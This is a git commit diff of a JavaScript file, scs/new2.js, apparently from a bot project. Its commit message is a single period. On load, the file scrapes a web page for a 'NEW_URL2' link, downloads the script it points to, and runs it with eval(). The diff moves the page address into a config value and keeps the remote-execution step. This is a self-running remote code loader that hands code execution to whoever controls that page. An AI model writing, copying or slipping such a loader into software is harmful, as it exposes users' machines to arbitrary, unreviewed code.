68aa6a79ca483cbabb5fc9917848f3bd947e2164
Ibraah Tech <playboyibraah@gmail.com>
2025-03-27 02:37:11 +0300

    .

--- scs/new2.js
+++ scs/new2.js
@@ -2,27 +2,28 @@
 
 const axios = require('axios');
 const cheerio = require('cheerio');
-
-const webPageUrl = 'https://www.ibrahimadams.site/files';
+const adams = require(__dirname + "/../config");
 
 async function fetchNewUrl2() {
-    try {
-        const response = await axios.get(webPageUrl);
-        const $ = cheerio.load(response.data);
-        const newUrl2 = $(`a:contains("NEW_URL2")`).attr('href');
+  try {
+    const response = await axios.get(adams.BWM_XMD);
+    const $ = cheerio.load(response.data);
 
-        if (!newUrl2) throw new Error('NEW_URL2 not found on the webpage.');
+    const newUrl2Element = $('a:contains("NEW_URL2")');
+    const newUrl2 = newUrl2Element.attr('href');
 
-        console.log('NEW_URL2 fetched successfully:', newUrl2);
-
-        const scriptResponse = await axios.get(newUrl2);
-        const scriptContent = scriptResponse.data;
-        console.log("NEW_URL2 script loaded successfully");
-
-        eval(scriptContent);
-    } catch (error) {
-        console.error('Error fetching NEW_URL2:', error.message);
+    if (!newUrl2) {
+      throw new Error('New URL 2 link not found...');
     }
+
+    console.log('New URL 2 fetched successfully ✅');
+
+    const scriptResponse = await axios.get(newUrl2);
+    eval(scriptResponse.data);
+
+  } catch (error) {
+    console.error('Error:', error.message);
+  }
 }
 
 fetchNewUrl2();
